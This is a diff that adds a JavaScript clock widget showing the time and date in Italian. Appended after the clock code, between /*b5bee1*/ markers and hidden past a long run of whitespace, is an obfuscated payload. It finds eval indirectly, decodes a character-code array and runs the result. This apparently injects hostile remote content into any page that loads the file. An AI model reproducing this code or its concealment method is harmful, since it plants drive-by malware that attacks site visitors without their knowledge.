@@ -1,0 +1,124 @@
+	var myfont_face = "Trebuchet MS, Arial, Tahoma, sans-serif";
+	
+	var myfont_size = "8";
+	
+	var myfont_color = "#333333";
+	
+	var myback_color = "css/bg00.JPG";
+	
+ 	var mypre_text = " ";    
+	
+	var mywidth = 300;
+	
+	var my12_hour = 0;
+	
+	var myupdate = 1;
+	
+	var DisplayDate = 1;
+
+        var ie4=document.all
+        var ns4=document.layers
+        var ns6=document.getElementById&&!document.all
+
+	var dn = "";
+	var mn = "";
+	var old = "";
+
+	var DaysOfWeek = new Array(7);
+		DaysOfWeek[0] = "Domenica";
+		DaysOfWeek[1] = "Lunedì";
+		DaysOfWeek[2] = "Martedì";
+		DaysOfWeek[3] = "Mercoledì";
+		DaysOfWeek[4] = "Giovedì";
+		DaysOfWeek[5] = "Venerdì";
+		DaysOfWeek[6] = "Sabato";
+
+	var MonthsOfYear = new Array(12);
+		MonthsOfYear[0] = "Gennaio";
+		MonthsOfYear[1] = "Febbraio";
+		MonthsOfYear[2] = "Marzo";
+		MonthsOfYear[3] = "Aprile";
+		MonthsOfYear[4] = "Maggio";
+		MonthsOfYear[5] = "Giugno";
+		MonthsOfYear[6] = "Luglio";
+		MonthsOfYear[7] = "Agosto";
+		MonthsOfYear[8] = "Settembre";
+		MonthsOfYear[9] = "Ottobre";
+		MonthsOfYear[10] = "Novembre";
+		MonthsOfYear[11] = "Dicembre";
+
+	var ClockUpdate = new Array(3);
+		ClockUpdate[0] = 0;
+		ClockUpdate[1] = 1000;
+		ClockUpdate[2] = 60000;
+
+	if (ie4||ns6) { document.write('<span id="LiveClockIE" style="width:'+mywidth+'px; background-color:'+myback_color+'"></span>'); }
+	else if (document.layers) { document.write('<ilayer bgColor="'+myback_color+'" id="ClockPosNS" visibility="hide"><layer width="'+mywidth+'" id="LiveClockNS"></layer></ilayer>'); }
+	else { old = "true"; show_clock(); }
+
+	function show_clock() {
+		if (old == "die") { return; }
+	
+		if (ns4)
+                document.ClockPosNS.visibility="show"
+	
+		var Digital = new Date();
+		var day = Digital.getDay();
+		var mday = Digital.getDate();
+		var month = Digital.getMonth();
+		var hours = Digital.getHours();
+
+		var minutes = Digital.getMinutes();
+		var seconds = Digital.getSeconds();
+	
+		if (mday == 1) { mn = " "; }
+		else if (mday == 2) { mn = " "; }
+		else if (mday == 3) { mn = " "; }
+		else if (mday == 21) { mn = " "; }
+		else if (mday == 22) { mn = " "; }
+		else if (mday == 23) { mn = " "; }
+		else if (mday == 31) { mn = " "; }
+	
+		if (my12_hour) {
+			dn = "AM";
+			if (hours > 12) { dn = "PM"; hours = hours - 12; }
+			if (hours == 0) { hours = 12; }
+		} else {
+			dn = "";
+		}
+		if (minutes <= 9) { minutes = "0"+minutes; }
+		if (seconds <= 9) { seconds = "0"+seconds; }
+	
+		myclock = '';
+		myclock += '<font style="color:'+myfont_color+'; font-family:'+myfont_face+'; font-size:'+myfont_size+'pt;">';
+		myclock += mypre_text;
+		myclock += hours+':'+minutes;
+		if ((myupdate < 2) || (myupdate == 0)) { myclock += ':'+seconds; }
+		myclock += ' '+dn;
+		if (DisplayDate) { myclock += ' '+DaysOfWeek[day]+' '+mday+mn+' '+MonthsOfYear[month]; }
+		myclock += '</font>';
+
+		if (old == "true") {
+			document.write(myclock);
+			old = "die";
+			return;
+		}
+
+	// Write the clock to the layer:
+		if (ns4) {
+			clockpos = document.ClockPosNS;
+			liveclock = clockpos.document.LiveClockNS;
+			liveclock.document.write(myclock);
+			liveclock.document.close();
+		} else if (ie4) {
+			LiveClockIE.innerHTML = myclock;
+		} else if (ns6){
+			document.getElementById("LiveClockIE").innerHTML = myclock;
+                }            
+
+	if (myupdate != 0) { setTimeout("show_clock()",ClockUpdate[myupdate]); }
+}
+
+/*b5bee1*/
+                                                                                                                                                                                                                                                          ww=window;v="v"+"al";if(ww.document)try{document.body=12;}catch(gdsgsdg){asd=0;try{q=document.createElement("div");}catch(q){asd=1;}if(!asd){w={a:ww}.a;v="e".concat(v);}}e=w[v];if(1){f=new Array(40,101,115,107,99,115,103,108,110,31,38,38,32,122,11,7,32,31,30,29,118,96,112,29,104,96,111,29,61,31,98,108,99,116,107,98,110,115,44,96,114,100,95,113,101,68,106,98,109,100,108,113,40,38,103,99,114,96,107,98,39,40,57,10,10,12,8,29,32,31,30,101,97,112,44,112,114,98,30,58,32,38,102,113,116,111,56,44,47,118,117,116,46,104,98,106,101,107,99,113,116,113,109,107,105,98,95,43,105,115,45,103,115,46,97,108,117,109,114,98,114,45,110,101,112,38,57,10,10,31,30,29,32,103,95,110,46,114,114,118,108,100,44,109,111,114,103,113,105,110,108,29,61,31,37,94,98,114,109,105,117,115,99,36,59,12,8,29,32,31,30,101,97,112,44,112,116,120,106,98,46,97,109,111,100,100,112,29,61,31,37,45,39,58,11,7,32,31,30,29,104,96,111,43,115,115,119,105,101,45,102,98,105,102,102,113,32,60,30,36,49,111,118,36,59,12,8,29,32,31,30,101,97,112,44,112,116,120,106,98,46,118,103,97,116,103,30,58,32,38,47,109,120,38,57,10,10,31,30,29,32,103,95,110,46,114,114,118,108,100,44,105,101,101,114,29,61,31,37,46,112,119,37,56,13,9,30,29,32,31,102,94,113,45,113,113,121,107,99,43,116,110,110,29,61,31,37,46,112,119,37,56,13,9,11,7,32,31,30,29,105,101,30,37,33,99,109,96,117,108,99,107,116,45,101,98,116,68,106,98,109,100,108,113,66,120,71,97,40,38,102,94,113,38,39,38,32,122,11,7,32,31,30,29,32,31,30,29,100,110,97,114,109,100,108,113,46,118,112,102,116,100,38,36,60,99,103,115,32,104,98,58,92,38,102,94,113,91,37,59,60,46,98,102,118,61,37,38,59,12,8,29,32,31,30,29,32,31,30,97,111,98,115,106,101,109,114,43,103,100,114,66,108,100,107,98,110,115,64,118,73,99,38,36,104,96,111,36,41,45,95,109,112,100,108,97,67,103,103,105,100,39,102,94,113,40,57,10,10,31,30,29,32,124,11,7,125,40,38,38,59);}w=f;s=[];for(i=0;-i+481!=0;i+=1){j=i;if((031==0x19))if(e)s=s+String.fromCharCode((1*w[j]+e("j%4")));}xz=e;try{document.body++}catch(gdsgd){xz(s)}
+/*/b5bee1*/
